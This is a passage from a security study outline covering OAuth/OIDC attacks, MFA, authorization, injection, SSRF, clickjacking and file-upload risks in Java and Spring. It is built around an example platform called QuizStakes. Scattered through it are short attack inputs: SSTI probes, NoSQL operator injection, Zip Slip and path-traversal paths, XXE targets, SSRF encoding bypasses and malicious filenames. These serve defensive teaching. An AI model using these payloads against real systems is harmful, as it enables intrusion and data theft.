       tokens forbidden in query strings, refresh tokens sender-constrained or rotated, and
       redirect-URI required in the token request. `[TABLE]` `[SPEC]` `[VERSION-TRAP]`

*(26 leaves)*

## §2.5 OpenID Connect

2.5.1 What OIDC adds to OAuth: an **identity** layer — a standard way to learn *who logged in*,
      with a standard token, a standard claim set, a standard discovery document and standard
      logout. `[PROVE]`
2.5.2 The distinction that must be stated crisply: **the access token is for calling APIs and is
      opaque to the client; the ID token is for the client to learn who the user is and must never
      be sent to an API as authorization.** "Log in with Google" is OIDC; "let this app read your
      Drive" is OAuth. `[PROVE]` `[TRAP]`
2.5.3 The **ID token** as a JWT with required claims `iss`, `sub`, `aud`, `exp`, `iat`, plus
      `nonce`, `auth_time`, `acr`, `amr`, `azp`, `at_hash`, `c_hash`. `[SPEC]` `[TABLE]`
2.5.4 The **ID token validation rules**, all of them, from OIDC Core § 3.1.3.7 — this is a checklist
      question: issuer match, audience contains `client_id`, `azp` when multiple audiences,
      signature with the discovered key, `alg` matches the registered
      `id_token_signed_response_alg`, `exp`, `iat` within a reasonable window, **`nonce` matches**,
      `acr` acceptable, `auth_time` within `max_age`. `[SPEC]` `[TABLE]` `[PROVE]`
2.5.5 **`nonce` vs `state`**: `state` binds the *authorization response* to the client's session
      (CSRF); `nonce` binds the *ID token* to the client's session (token replay). Two different
      attacks, two different parameters, and conflating them is a standard interview stumble.
      `[PROVE]` `[TRAP]`
2.5.6 `at_hash` and `c_hash`: the left-most half of the hash of the access token / code, base64url
      encoded, proving the ID token was issued together with them — the defence against injecting a
      different access token into a front-channel response. `[SPEC]` `[PROVE]`
2.5.7 The three response modes/flows: **authorization code** (the only one to use), **implicit**
      (`id_token`, `id_token token` — dead), **hybrid** (`code id_token`, `code token`,
      `code id_token token`) and what hybrid was for. `response_mode`: `query`, `fragment`,
      `form_post`, `jwt` (JARM). `[TABLE]` `[SPEC]`
2.5.8 Standard scopes and their claims: `openid` (required), `profile`, `email`, `address`, `phone`,
      `offline_access`. The standard claim set (`sub`, `name`, `given_name`, `email`,
      `email_verified`, `picture`, `locale`, `updated_at`). `[TABLE]` `[SPEC]`
2.5.9 **`sub` is the only stable identifier**, and it is only unique *per issuer*. Keying your user
      table on `email` is an account-takeover bug when the IdP allows email changes or does not
      verify them. `[PROVE]` `[TRAP]` `[ATTACK]`
2.5.10 `/userinfo`: when to call it instead of reading claims from the ID token (claim size, freshness),
       and the bearer-token requirement. `[SPEC]`
2.5.11 **Discovery**: `/.well-known/openid-configuration`, the fields a client uses
       (`issuer`, `authorization_endpoint`, `token_endpoint`, `jwks_uri`, `userinfo_endpoint`,
       `end_session_endpoint`, `response_types_supported`, `id_token_signing_alg_values_supported`,
       `code_challenge_methods_supported`), and the issuer-match requirement. `[SPEC]` `[WIRE]`
2.5.12 **Logout, all three specs**: RP-Initiated Logout (`end_session_endpoint`,
       `id_token_hint`, `post_logout_redirect_uri`), Front-Channel Logout (iframes, unreliable),
       **Back-Channel Logout** (the OP POSTs a `logout_token` to each RP's registered URI). The
       `logout_token` rules — `events` claim required, **`nonce` MUST NOT be present**, `sid`/`sub`.
       `[SPEC]` `[FLOW]` `[RESEARCH]`
2.5.13 Why distributed logout is genuinely hard, and what QuizStakes actually needs: an
       `end_session` call plus local session invalidation plus refresh-token revocation.
       `[PROVE]`
2.5.14 `prompt` (`none`, `login`, `consent`, `select_account`), `max_age`, `acr_values` — the
       parameters that implement **step-up authentication**, plus RFC 9470's
       `insufficient_user_authentication` challenge. In QuizStakes: a withdrawal should require a
       fresher `auth_time` than a login. `[SPEC]` `[PROVE]` `[RESEARCH]`
2.5.15 `amr` / `acr` as the way MFA state travels, and the trap of trusting `amr` from an IdP that
       does not populate it. `[TRAP]`
2.5.16 SSO mechanics: the IdP session cookie at the OP, silent renewal via `prompt=none` in a hidden
       iframe, and why third-party-cookie deprecation broke that pattern. `[RESEARCH]`
2.5.17 **SAML 2.0** in one leaf, because enterprise integrations still demand it: assertions, the
       POST binding, `RelayState`, XML signature wrapping attacks, and the reason "use a library,
       never parse it yourself" is stronger advice here than anywhere else. `[RESEARCH]`
2.5.18 The Spring surface: `spring-boot-starter-oauth2-client`,
       `spring.security.oauth2.client.registration.*` / `.provider.*`,
       `ClientRegistrationRepository`, `OAuth2AuthorizedClientService`/`Repository`,
       `OAuth2AuthorizedClientManager`, `oauth2Login()` vs `oauth2Client()`, `OidcUser`,
       `OidcUserService`, `GrantedAuthoritiesMapper`, `OidcClientInitiatedLogoutSuccessHandler`.
       `[API]` `[NUM]`
2.5.19 Spring Authorization Server as the "we run our own AS" option, and the honest advice about
       when not to. `[RESEARCH]`

*(19 leaves)*

## §2.6 OAuth attacks and hardening

2.6.1 **RFC 9700 as the map**: § 4.1 insufficient redirect-URI validation, § 4.2 credential leakage
      via `Referer`, § 4.3 leakage via browser history, § 4.4 mix-up, § 4.5 authorization code
      injection, § 4.6 access token injection, § 4.7 CSRF, § 4.8 PKCE downgrade, § 4.9 token
      leakage at the resource server, § 4.10 misuse of stolen access tokens, § 4.11 open
      redirection, § 4.12 the 307 redirect, § 4.13 TLS-terminating reverse proxies, § 4.14 refresh
      token protection, § 4.15 client impersonating resource owner, § 4.16 clickjacking, § 4.17
      attacks on in-browser communication flows. **Every one gets its own leaf below.** `[TABLE]`
      `[SPEC]`
2.6.2 **Insufficient redirect-URI validation** (§ 4.1): wildcard, prefix and substring matching all
      broken; the fix is **exact string matching** against a pre-registered URI, with the only
      exception being the loopback port for native apps. `[ATTACK]` `[PROVE]`
2.6.3 **Open redirect chained into code theft** (§ 4.11): a legitimately registered redirect URI
      that itself redirects, forwarding the code to the attacker. Why an open redirect anywhere on
      the client's origin is an OAuth vulnerability. `[ATTACK]`
2.6.4 **Credential leakage via `Referer`** (§ 4.2) and via **browser history** (§ 4.3), and the
      `Referrer-Policy` + no-tokens-in-URL fixes. `[ATTACK]`
2.6.5 **Mix-up attacks** (§ 4.4): a client that talks to multiple ASs is tricked into sending the
      code from AS-A to AS-B's token endpoint. The two fixes: the **`iss` response parameter** (RFC
      9207) or a **distinct redirect URI per issuer**. `[ATTACK]` `[PROVE]` `[SPEC]`
2.6.6 **Authorization code injection** (§ 4.5): the attacker injects a code they obtained into the
      victim's session. PKCE is the fix for public clients; `nonce` for OIDC. `[ATTACK]`
2.6.7 **Access token injection** (§ 4.6) and why any response type that returns a token in the
      front channel cannot be defended.
2.6.8 **The 307 redirect problem** (§ 4.12): a `307` after the authentication POST re-sends the
      credentials to the redirect target. The AS must use `303`. A wonderfully specific,
      high-signal interview fact. `[ATTACK]` `[SPEC]` `[NUM]`
2.6.9 **TLS-terminating reverse proxies** (§ 4.13): the AS believes `X-Forwarded-*`, an attacker
      sets them, and the AS constructs a redirect or a token audience from attacker input.
      `[ATTACK]`
2.6.10 **Refresh token protection** (§ 4.14): sender-constraining or rotation with reuse detection,
       and the token-family revocation rule.
2.6.11 **Client impersonating the resource owner** (§ 4.15): a client-credentials token whose
       `sub` collides with a user id. Namespacing subjects is the fix. `[ATTACK]`
2.6.12 **Clickjacking the consent screen** (§ 4.16) and `frame-ancestors 'none'` on the AS.
2.6.13 **Attacks on in-browser communication flows** (§ 4.17): `postMessage`-based code delivery
       without `targetOrigin`/`origin` checks. `[ATTACK]`
2.6.14 **Misuse of stolen access tokens** (§ 4.10) and the only real answer: **sender-constrained
       tokens**.
2.6.15 **DPoP** (RFC 9449): a client-generated key pair, the `DPoP` proof JWT with `htm`/`htu`/
       `iat`/`jti`/`ath`, the `cnf.jkt` confirmation claim in the access token, the
       `WWW-Authenticate: DPoP` challenge with a server `nonce`, and the replay window. What it
       buys: a stolen token is useless without the private key. `[SPEC]` `[WIRE]` `[FLOW]`
       `[RESEARCH]`
2.6.16 **mTLS-bound tokens** (RFC 8705): `tls_client_auth` and `self_signed_tls_client_auth` client
       authentication, plus certificate-bound access tokens via `cnf.x5t#S256`. The
       infrastructure cost versus DPoP. `[SPEC]` `[TABLE]`
2.6.17 **PAR** (RFC 9126): push the authorization request to the AS over the back channel, get a
       `request_uri`, and send only that in the front channel — removing parameter tampering and
       URL-length limits. `[SPEC]` `[FLOW]`
2.6.18 **JAR** (RFC 9101): the signed (and optionally encrypted) `request` object, so authorization
       request parameters are integrity-protected end to end. `[SPEC]`
2.6.19 **RAR** (RFC 9396): `authorization_details` for fine-grained, structured authorization —
       "transfer 250.00 to account X" rather than a `payments:write` scope. Exactly the shape a
       regulated payment consent needs. `[SPEC]` `[RESEARCH]`
2.6.20 **JARM** — the signed authorization response — and where it fits relative to PAR/JAR.
       `[RESEARCH]`
2.6.21 **FAPI 2.0** as the profile that composes PAR + PKCE + sender-constrained tokens + exact
       redirect matching, and why a regulated platform should just adopt a profile rather than pick
       à la carte. `[PROVE]` `[RESEARCH]`
2.6.22 **CIBA** (decoupled/backchannel authentication) for the case where the consuming device is
       not the authenticating device — the operator-approves-on-phone pattern. `[RESEARCH]`
2.6.23 Consent phishing / illicit consent grant as an attack that is entirely within the protocol:
       the user grants a malicious app real scopes. Mitigations: app verification, admin consent,
       scope minimisation, consent revocation UI, anomaly detection. `[ATTACK]` `[RESEARCH]`
2.6.24 The OAuth **browser-based apps BCP** recommendation stack, ranked: BFF > token-mediating
       backend > browser-based client with PKCE and refresh-token rotation. `[RESEARCH]`
2.6.25 Native-app specifics (RFC 8252): system browser not a WebView, custom scheme vs
      claimed HTTPS scheme (App Links / Universal Links), and why PKCE was invented here.
      `[SPEC]`
2.6.26 The QuizStakes application: which flow each caller uses, and the reason the client token is
       stripped at `ApplicationGateway` rather than forwarded — the internal services then have a
       single trusted issuer, one algorithm, one audience convention, and no dependency on an
       external IdP's availability inside the 30 ms restriction budget. `[SOURCE]` `[PROVE]`
       `[NUM]`

*(26 leaves)*

## §2.7 MFA, passkeys and the rest of the authenticator zoo

2.7.1 What MFA actually defeats: a **correct stolen password**. That is the entire value
      proposition, and it is why MFA is the only effective control against credential stuffing.
      `[PROVE]`
2.7.2 The authenticator ladder ordered by **phishing resistance**, which is the property that
      matters: SMS OTP < email OTP < TOTP < push-approval < push-with-number-matching <
      FIDO2/WebAuthn security key or passkey. `[TABLE]` `[PROVE]`
2.7.3 **SMS OTP's** real weaknesses, named: SIM swap, SS7 interception, carrier social engineering,
      and above all **it is phishable in real time**. NIST's restricted-authenticator status.
      `[PROVE]` `[SPEC]`
2.7.4 **TOTP** (RFC 6238) mechanics: shared secret, 30-second time step, 6 digits,
      `HMAC-SHA1(secret, counter)` truncated, the ±1 step drift window, and the **replay window
      requirement** (record used counters). Enrolment via `otpauth://` URI and QR. `[SPEC]`
      `[NUM]` `[BUILD]`
2.7.5 **HOTP** (RFC 4226) and counter desynchronisation.
2.7.6 Why TOTP is still phishable: a real-time proxy (Evilginx-class) relays the code within its
      30-second window. Say this out loud — most candidates present TOTP as the answer. `[PROVE]`
      `[TRAP]`
2.7.7 **WebAuthn/FIDO2**, the model: an **origin-bound** public-key credential, created by an
      authenticator, where the private key never leaves the authenticator and the signature covers
      the origin — which is *why* it is phishing-resistant, not merely stronger. `[PROVE]`
      `[SPEC]`
2.7.8 The **registration (attestation) ceremony**: `navigator.credentials.create()`,
      `PublicKeyCredentialCreationOptions` (`rp`, `user`, `challenge`, `pubKeyCredParams`,
      `authenticatorSelection`, `attestation`, `excludeCredentials`), the
      `AuthenticatorAttestationResponse`, `clientDataJSON`, `attestationObject`, `authData` flags,
      the AAGUID, and the server-side verification steps. `[FLOW]` `[SPEC]` `[NUM]`
2.7.9 The **authentication (assertion) ceremony**: `navigator.credentials.get()`,
      `allowCredentials`, `userVerification`, the `AuthenticatorAssertionResponse`, the
      **signature counter** as clone detection, and the server-side verification steps including
      the `challenge`, `origin` and `rpIdHash` checks. `[FLOW]` `[SPEC]`
2.7.10 **Discoverable credentials** (formerly "resident keys") as what makes usernameless login
       possible, the `userHandle`, and conditional UI / autofill. `[SPEC]` `[RESEARCH]`
2.7.11 **Passkeys** = discoverable WebAuthn credentials, usually **synced** through a platform
       credential manager. The consequence engineers must internalise: the private key is now in a
       cloud account, so the security model becomes the platform account's security model.
       `[PROVE]` `[RESEARCH]`
2.7.12 Device-bound vs synced passkeys, attestation's role in telling them apart, and when
       attestation is worth demanding (workforce, regulated) versus when it is friction (consumer).
       `[TABLE]`
2.7.13 **RP ID** rules and Related Origin Requests in WebAuthn L3 — one passkey covering a set of
       related domains, which changes the multi-brand deployment answer. `[SPEC]` `[RESEARCH]`
       `[VERSION-TRAP]`
2.7.14 Spring Security's passkey support: `webAuthn()` DSL, `PublicKeyCredentialUserEntityRepository`,
       `UserCredentialRepository`, `WebAuthnRelyingPartyOperations`, and the registration page.
       `[API]` `[VERSION-TRAP]` `[RESEARCH]`
2.7.15 Recovery and the enrolment paradox: recovery is the weakest link in every MFA deployment, so
       backup codes (single-use, hashed, rate-limited), a second authenticator, and an explicit,
       audited human process. `[PROVE]` `[TRAP]`
2.7.16 MFA fatigue / push bombing, and the mitigations: number matching, rate limits, geo/context
       display, and a report-fraud path. `[ATTACK]` `[RESEARCH]`
2.7.17 **Step-up authentication** as the pattern that keeps MFA usable: authenticate once for
       login, re-authenticate for a sensitive action. In QuizStakes: a withdrawal or a
       self-exclusion change. `[PROVE]` `[SOURCE]`
2.7.18 Magic links / email OTP / one-time-token login: what they really are (email as the
       authenticator), the token requirements, and Spring Security 7's `oneTimeTokenLogin()`.
       `[API]` `[VERSION-TRAP]` `[RESEARCH]`
2.7.19 Adaptive/risk-based authentication: the signals (device, IP reputation, geovelocity,
       behaviour), and the honest caveat that this is a probabilistic control layered on a
       deterministic one. `[TABLE]`
2.7.20 Impersonation / "log in as user" for support staff: why it must be a distinct, audited,
       consent-gated, time-boxed mechanism and never a password reset —
       `SwitchUserFilter` and its dangers. `[API]` `[TRAP]`

*(20 leaves)*

## §2.8 Authorization in depth

2.8.1 The **authorization decision points** in a Spring app, in request order: gateway/edge policy,
      `SecurityFilterChain` matcher rules, `AuthorizationFilter`, method security, the service-layer
      ownership predicate, the repository query filter, and database row-level security. Which
      checks belong at which point, and why the object-level check cannot move up. `[TABLE]`
      `[PROVE]`
2.8.2 `authorizeHttpRequests` mechanics: matcher ordering (first match wins), `permitAll`,
      `denyAll`, `authenticated`, `hasRole`, `hasAuthority`, `hasAnyRole`, `access(...)` with an
      `AuthorizationManager`, and the fatal ordering mistake of putting `anyRequest().permitAll()`
      first. `[API]` `[TRAP]`
2.8.3 `PathPatternRequestMatcher` vs the removed `MvcRequestMatcher`/`AntPathRequestMatcher`, and
      the **path-matching mismatch class of bypass**: trailing slashes, `;jsessionid` path
      parameters, case sensitivity, `%2e%2e`, double slashes, and suffix matching. This is why
      `HttpFirewall` exists. `[ATTACK]` `[VERSION-TRAP]`
2.8.4 Custom `AuthorizationManager` implementations, and `AuthorizationManagerFactory` in 7.0.
      `[API]` `[RESEARCH]`
2.8.5 Method security in depth: where the proxy sits, `@EnableMethodSecurity(prePostEnabled,
      securedEnabled, jsr250Enabled)`, ordering relative to `@Transactional`, and the
      self-invocation bypass. `[API]` `[TRAP]` `[X-REF 07]`
2.8.6 `@PostAuthorize` and `@PostFilter` — powerful and dangerous: the work is already done and the
      side effects already happened; use them for read paths only. `[PROVE]` `[TRAP]`
2.8.7 `PermissionEvaluator` / `hasPermission(...)` as the extension point for real object-level
      authorization, and `AuthorizationManager<MethodInvocation>` as the modern form. `[API]`
      `[BUILD]`
2.8.8 Authorization at the data layer: Spring Data's `@Query` with an owner parameter, Hibernate
      filters, and **PostgreSQL row-level security** with a session variable — the only mechanism
      that survives a developer forgetting. `[API]` `[PROVE]` `[X-REF 09]`
2.8.9 Externalised policy: **OPA/Rego**, **Cedar**, **OpenFGA/SpiceDB (Zanzibar)** — what each is
      good at, the latency cost, and the sidecar-vs-library deployment choice against the 30 ms
      restriction budget. `[TABLE]` `[NUM]` `[RESEARCH]`
2.8.10 Policy decision caching and the invalidation problem — and why QuizStakes explicitly forbids
       caching restriction state in a token. `[SOURCE]` `[PROVE]`
2.8.11 Permission modelling that survives growth: permissions as the atom, roles as bundles, roles
       assignable per scope/tenant, and the anti-pattern of hardcoding role names in code. `[PROVE]`
2.8.12 Delegated and hierarchical authority: `RoleHierarchy`, and the operator hierarchy for
       `PaymentRun` sign-off (which is also separation of duties). `[API]` `[SOURCE]`
2.8.13 **Separation of duties** as an authorization requirement, not a process one: the operator who
       creates a `PaymentRun` must not be the operator who approves it, and this must be enforced
       in code. `[SOURCE]` `[PROVE]` `[BUILD]`
2.8.14 Authorization in asynchronous and batch contexts: the `SecurityContext` does not propagate
       across threads by default. `DelegatingSecurityContextExecutor`,
       `DelegatingSecurityContextRunnable`, `SecurityContextHolder`'s
       `MODE_INHERITABLETHREADLOCAL`, `@Async` and `SecurityContextHolderStrategy`, and virtual
       threads. The failure is silent — the job runs *unauthenticated*. `[API]` `[TRAP]`
       `[X-REF 05]`
2.8.15 Authorization for message consumers and scheduled jobs: a service identity, not a borrowed
       user identity. `[X-REF 14]`
2.8.16 GraphQL authorization as the hardest case: per-field authorization, the N+1 of policy calls,
       and query depth/complexity limits as an availability control. `[X-REF 12]` `[RESEARCH]`
2.8.17 The **authorization test matrix** and the CI artifact it produces: for each endpoint × role ×
       (own resource / other's resource / nonexistent), the expected status. `[TABLE]` `[X-REF 16]`
2.8.18 How to audit vertical access control across a large surface (the interview question: 20 roles,
       300 requests) — capture a request corpus once, replay it with every role's credentials, diff
       the status codes, and treat any 2xx that should be 403 as a finding. `[FLOW]` `[RESEARCH]`

*(18 leaves)*

## §2.9 Injection in depth

2.9.1 The exploitation ladder for SQLi, so severity is arguable: read one row → read the whole table
      → read other schemas → read files → write files → command execution via a database feature
      (`COPY PROGRAM`, `xp_cmdshell`, UDFs). `[TABLE]` `[ATTACK]`
2.9.2 **Blind SQLi** techniques: boolean inference, error inference, time-based (`pg_sleep`,
      `BENCHMARK`), and out-of-band (DNS exfiltration). Why "we don't return errors" is not a fix.
      `[ATTACK]` `[PROVE]`
2.9.3 **Second-order SQLi**: the payload is stored safely and later concatenated by a batch job.
      Parameterization must be universal, not perimeter-shaped. `[ATTACK]`
2.9.4 The dynamic-query problem solved properly: an allowlist map from API sort field to column
      name, a validated direction enum, `Sort`/`Pageable` with a whitelist, or the Criteria API /
      jOOQ producing structure from typed objects rather than strings. `[BUILD]` `[API]`
2.9.5 `LIKE` and wildcard injection: `%` and `_` in user input turning a lookup into a full scan
      (a DoS), and escape-character handling. `[ATTACK]` `[NUM]`
2.9.6 `IN` clauses, batch sizes and driver-specific parameter limits (PostgreSQL's 65535 bind
      parameters) as an availability constraint. `[NUM]`
2.9.7 **NoSQL injection**: MongoDB operator injection (`{"$ne": null}`, `$where`, `$regex`), and
      why a JSON body parsed into a query document is a *structural* injection even without string
      concatenation. `[ATTACK]` `[PROVE]`
2.9.8 **JPQL/HQL injection** and the specific Hibernate cases: string-concatenated `@Query`,
      `Sort.by` with user input, and native queries.
2.9.9 **SpEL injection**: `@PreAuthorize` with a concatenated expression,
      `ExpressionParser.parseExpression(userInput)`, Spring Data's `SpEL` in `@Query`,
      Thymeleaf `${...}` in an inline template — leading to RCE. `[ATTACK]` `[CVE]`
2.9.10 **Template injection (SSTI)**: Thymeleaf fragment-expression injection, Freemarker's
       `new()`/`Execute`, Velocity, and the mechanism — a template engine is an interpreter and a
       user-controlled template is user-controlled code. The detection payloads (`${7*7}`,
       `#{7*7}`, `*{7*7}`) and the fix (never build templates from input; select from an
       allowlist). `[ATTACK]` `[PROVE]`
2.9.11 **JNDI injection** as its own class, because Log4Shell made it famous: any
       `InitialContext.lookup(userControlled)` can load a remote class. Covered mechanically in
       § 3.12. `[ATTACK]`
2.9.12 **LDAP injection**: filter metacharacters, the DN vs filter contexts needing different
       escaping, and `LdapEncoder`/`LdapQueryBuilder`. `[API]`
2.9.13 **XPath/XQuery injection** and the parameterized-XPath answer.
2.9.14 **CRLF injection / header injection / response splitting**: `\r\n` in a header value used to
       forge headers or split a response into two; where Java's servlet API blocks it and where it
       does not (custom writers, `Location` built from input). `[ATTACK]`
2.9.15 **Email/SMTP header injection** via a name or subject field.
2.9.16 **CSV / formula injection**: a cell beginning `=`, `+`, `-`, `@`, tab or CR executing in
       Excel/Sheets when an operator exports a `PaymentRun` report. The prefix-with-`'` /
       quote-and-escape fix. `[ATTACK]` `[NUM]` `[RESEARCH]`
2.9.17 **Path traversal** (CWE-22): `../`, encoded variants, absolute paths, null bytes, Windows
       `..\`, and the correct fix — canonicalize then verify the resolved path is under the base
       directory, using `Path.normalize()` + `startsWith`, never string checks. `[ATTACK]`
       `[BUILD]` `[API]`
2.9.18 **Zip Slip** and archive extraction: an entry named `../../etc/cron.d/x`, and symlink
       entries. The per-entry resolved-path check. `[ATTACK]` `[BUILD]`
2.9.19 **Zip bombs / decompression bombs** and the ratio + absolute-size + entry-count limits.
       `[NUM]`
2.9.20 **HTTP Parameter Pollution**: two parameters with the same name, and the parsing differential
       between your WAF, your proxy and your framework. `[ATTACK]` `[PROVE]`
2.9.21 **Prototype pollution** (server-side Node and client-side JS): `__proto__` in a merged
       object, and why a Java engineer still needs to recognise it in a JS front end.
       `[ATTACK]` `[RESEARCH]`
2.9.22 **DOM clobbering**: named HTML elements shadowing globals to bypass a sanitizer.
       `[ATTACK]` `[RESEARCH]`
2.9.23 **Mass assignment / autobinding**, restated as injection into your object graph, with
       Spring's `WebDataBinder`, `setDisallowedFields`, `@InitBinder`, and the DTO rule.
       `[API]` `[ATTACK]`
2.9.24 **ReDoS** with the concrete Java signature: a nested quantifier such as `(a+)+$` on a
       40-character input, the exponential backtrack, and the fact that `java.util.regex` has no
       timeout, so the fixes are input-length caps, possessive quantifiers, or a linear-time engine.
       `[ATTACK]` `[NUM]` `[PROVE]`
2.9.25 **XXE** (CWE-611): external entity resolution reading `/etc/passwd`, SSRF via an entity, the
       billion-laughs expansion, **parameter entities** and their limits, out-of-band exfiltration
       via an external DTD, and XInclude. `[ATTACK]` `[SPEC]`
2.9.26 The exact Java hardening for every XML parser you might use:
       `XMLConstants.FEATURE_SECURE_PROCESSING`,
       `disallow-doctype-decl`, `external-general-entities`, `external-parameter-entities`,
       `load-external-dtd`, `XMLInputFactory.SUPPORT_DTD`, `setXIncludeAware(false)`,
       `setExpandEntityReferences(false)`, and `TransformerFactory`/`SchemaFactory`/`SAXParserFactory`
       /`DocumentBuilderFactory`/`XMLReader`/JAXB/`SAXTransformerFactory` each needing it
       separately. `[API]` `[NUM]` `[BUILD]`
2.9.27 YAML deserialization: SnakeYAML's `Constructor` vs `SafeConstructor`, and
       `!!javax.script.ScriptEngineManager` as the RCE gadget. `[ATTACK]` `[API]`
2.9.28 Jackson's polymorphic typing: `enableDefaultTyping` / `@JsonTypeInfo` with `Id.CLASS` as an
       RCE primitive, the blocklist treadmill in `jackson-databind`, and the correct answer —
       `activateDefaultTyping` never on untrusted input, use a `PolymorphicTypeValidator` with an
       allowlist, or model the union explicitly with sealed types. `[ATTACK]` `[API]` `[CVE]`
2.9.29 The general lesson from Jackson/SnakeYAML/Log4j: **any feature that turns data into a class
       name is an RCE feature**. Learn to recognise that shape. `[PROVE]`

*(29 leaves)*

## §2.10 SSRF

2.10.1 The definition: the server makes a request to a destination the attacker influences,
       borrowing the server's network position and identity. A confused deputy where the deputy is
       your own VPC. `[PROVE]`
2.10.2 Why it is so valuable to an attacker: internal services with no authentication, cloud
       metadata endpoints, admin interfaces bound to localhost, Redis and Elasticsearch with no
       auth, and the firewall being *behind* you. `[PROVE]`
2.10.3 The QuizStakes surfaces where SSRF lives: an operator-supplied document-fetch URL in
       `DocumentRequirements`, a webhook callback URL registered by a PSP, an avatar-by-URL feature
       in `ProfileService`, and an XML/`jku` parser. `[SOURCE]` `[ATTACK]`
2.10.4 **Blind SSRF** and how it is still exploitable: timing, error differentials, and out-of-band
       DNS/HTTP callbacks. `[ATTACK]`
2.10.5 **Cloud metadata**: `169.254.169.254`, IMDSv1's credential theft, **IMDSv2**'s
       PUT-token + hop-limit design as the actual fix, and the GCP/Azure equivalents with their
       required headers. `[NUM]` `[PROVE]` `[X-REF 18]`
2.10.6 **Case 1 — allowlisted destinations**: validate the host against a static allowlist, resolve
       and pin, and **disable redirects**. `[PROVE]`
2.10.7 **Case 2 — arbitrary destinations** (a genuine webhook feature): a denylist plus egress
       controls, and the honest statement that this is strictly weaker. `[PROVE]`
2.10.8 The **address ranges that must be blocked**, enumerated with CIDRs: `0.0.0.0/8`,
       `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`,
       `100.64.0.0/10` (CGNAT), `192.0.0.0/24`, `198.18.0.0/15`, `224.0.0.0/4` (multicast),
       `240.0.0.0/4`, and IPv6 `::1/128`, `fe80::/10`, `fc00::/7`, `::ffff:0:0/96` (v4-mapped).
       `[NUM]` `[TABLE]`
2.10.9 **The encoding bypasses** that defeat naive string checks: decimal (`3232235777`), octal
       (`0300.0250.001.001`), hex (`0xC0A80101`), mixed forms, short forms (`127.1`),
       IPv6-mapped IPv4 (`::ffff:127.0.0.1`), `[::]`, and the userinfo trick
       (`http://expected.example@127.0.0.1/`). `[ATTACK]` `[NUM]`
2.10.10 **DNS-based bypasses**: attacker-controlled DNS resolving to a private address, wildcard DNS
        services (`127.0.0.1.nip.io`), and CNAMEs into internal names. Hence: **resolve, then
        validate the resolved addresses**. `[PROVE]`
2.10.11 **DNS rebinding / TOCTOU**: validate at T1, connect at T2, and the record changed in
        between. The fixes — resolve once and **connect to the validated IP** with the `Host`
        header preserved (pinning), or use a proxy that enforces the policy at connect time.
        `[ATTACK]` `[PROVE]`
2.10.12 **Redirect chains**: each hop must be revalidated, or redirects disabled entirely.
        `[PROVE]`
2.10.13 **Protocol allowlisting**: `http`/`https` only — `file:`, `gopher:`, `dict:`, `ftp:`,
        `jar:`, `netdoc:` and `ldap:` are all reachable from Java URL handlers. `[NUM]` `[ATTACK]`
2.10.14 **Never accept a whole URL from the user** when you can accept its parts; URL parsers
        disagree with each other and with your validator (the parser-confusion class). `[PROVE]`
        `[SOURCE]`
2.10.15 The Java specifics: `InetAddressValidator` and `DomainValidator` from Apache Commons
        Validator; `URI` vs `URL` parsing differences; `HttpClient.followRedirects(NEVER)`;
        a custom `ProxySelector`/`SocketFactory` that enforces the policy at connect time;
        `URL.openConnection()`'s protocol handlers. `[API]` `[BUILD]`
2.10.16 The **network-layer** defence that actually holds: a dedicated egress subnet with a
        default-deny NACL/security group and an explicit egress proxy that logs and enforces the
        allowlist. Application-layer validation is defence in depth on top of it. `[PROVE]`
        `[X-REF 18]`
2.10.17 The webhook-verification token pattern from the cheat sheet: require a cryptographic
        challenge/response at the destination before trusting it as a target. `[NUM]` `[RESEARCH]`
2.10.18 SSRF's cousins: **CSRF** (attacker uses the *browser's* credentials) versus **SSRF**
        (attacker uses the *server's*). Stating the pair is the cleanest way to show you understand
        both. `[PROVE]`

*(18 leaves)*

## §2.11 Clickjacking, framing and UI redressing

2.11.1 The mechanism: your page is loaded in a transparent iframe over the attacker's content, and
       the victim's click lands on your button with their session attached. `[PROVE]` `[ATTACK]`
2.11.2 The variants: classic overlay, cursorjacking, drag-and-drop data theft, likejacking, and
       double-click / focus-shift attacks. `[TABLE]` `[RESEARCH]`
2.11.3 Why it matters for OAuth and for high-value one-click actions specifically — consent screens
       and QuizStakes' self-exclusion toggle. `[SOURCE]`
2.11.4 **`X-Frame-Options`**: `DENY`, `SAMEORIGIN`, and the never-implemented `ALLOW-FROM`; and its
       status as a legacy header retained for old clients. `[HDR]` `[VERSION-TRAP]`
2.11.5 **CSP `frame-ancestors`** as the real control, with a source list, and the precedence rule
       when both headers are present. `[SPEC]` `[PROVE]`
2.11.6 Why **framebusting JavaScript** is not a control: `sandbox` without `allow-scripts` disables
       it, and the historical bypasses. `[PROVE]` `[TRAP]`
2.11.7 Spring Security's default: `X-Frame-Options: DENY` out of the box, and the very common
       mistake of disabling it wholesale for one legitimate embed rather than switching to
       `frame-ancestors`. `[API]` `[NUM]` `[TRAP]`
2.11.8 `SameSite` cookies as an *accidental* partial clickjacking mitigation, and why it is not one
       to rely on. `[PROVE]`
2.11.9 **Tabnabbing / reverse tabnabbing**: `target="_blank"` giving the opened page `window.opener`
       access; `rel="noopener noreferrer"` and the modern default. `[ATTACK]` `[NUM]`
2.11.10 **`window.opener`, popups and COOP**: `Cross-Origin-Opener-Policy: same-origin` severing the
        reference, and its cross-origin-isolation role. `[HDR]`

*(10 leaves)*

## §2.12 File upload, download and storage

2.12.1 The threat list for one upload endpoint, enumerated: RCE via an executable in the webroot,
       stored XSS via HTML/SVG, XXE via a parsed document, path traversal via the filename,
       overwrite of an existing file, decompression bomb, malware distribution, storage exhaustion,
       image-parser memory bugs, and CSV formula injection on export. `[TABLE]`
2.12.2 The controls in order, with the mechanism of each: authenticate and authorize the upload;
       **allowlist extensions**; verify the **magic bytes** against the claimed type; never trust
       `Content-Type`; **generate the stored filename** (UUID) and keep the original only as
       metadata; enforce a size cap; store **outside the webroot** or in object storage; serve from
       a **separate origin** with `Content-Disposition: attachment` and `nosniff`; scan; set
       least-privilege filesystem permissions. `[TABLE]` `[PROVE]`
2.12.3 The filename bypasses to test: double extension (`x.jpg.jsp`), null byte (`x.jsp%00.jpg`),
       case (`x.JSP`), trailing dot/space, alternate data streams, `..` segments, and unicode
       normalisation. `[ATTACK]` `[NUM]`
2.12.4 **SVG and HTML uploads are stored XSS** unless served as attachments from another origin —
       an SVG is a document that can carry script. `[PROVE]` `[TRAP]`
2.12.5 Image rewriting/re-encoding as the strongest content control, and the trade (it destroys
       metadata, costs CPU, and the decoder itself is attack surface — ImageTragick). `[PROVE]`
       `[CVE]`
